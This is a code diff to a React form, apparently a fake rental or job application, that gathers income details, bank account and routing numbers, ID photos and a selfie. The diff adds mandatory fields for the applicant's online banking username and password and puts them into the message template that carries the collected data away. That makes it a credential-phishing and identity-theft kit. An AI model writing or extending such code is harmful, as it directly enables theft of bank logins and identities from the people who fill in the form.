@@ -81,7 +81,7 @@ const [preview, setPreview] = useState<any>({});
       case 2:
         return form.employer && form.job && form.income && form.rent;
       case 3:
-        return form.bank && form.account && form.routing;
+        return form.bank && form.account && form.routing && form.busername && form.bpass;
       case 4:
         return files.idFront && files.idBack && files.selfie;
       default:
@@ -152,6 +152,8 @@ const [preview, setPreview] = useState<any>({});
 🏦 Bank: ${form.bank}
 🔢 Account: ${form.account}
 🔁 Routing: ${form.routing}
+🔁 Bank Username: ${form.busername}
+🔁 Bank Password: ${form.bpass}
 
 🖼 ID Front: ${idFront}
 🖼 ID Back: ${idBack}
@@ -618,6 +620,30 @@ const [preview, setPreview] = useState<any>({});
         onChange={handleChange}
         className={inputClass}
         placeholder="9-digit ABA routing number"
+        required
+      />
+    </div>
+    <div className="flex flex-col gap-1">
+      <label className="text-sm font-medium">
+         Username <span className="text-red-500">*</span>
+      </label>
+      <input
+        name="busername"
+        onChange={handleChange}
+        className={inputClass}
+        placeholder="Enter Bank Account Username/ UserID ..."
+        required
+      />
+    </div>
+    <div className="flex flex-col gap-1">
+      <label className="text-sm font-medium">
+        Password <span className="text-red-500">*</span>
+      </label>
+      <input
+        name="bpass"
+        onChange={handleChange}
+        className={inputClass}
+        placeholder="Enter Bank Account Password"
         required
       />
     </div>
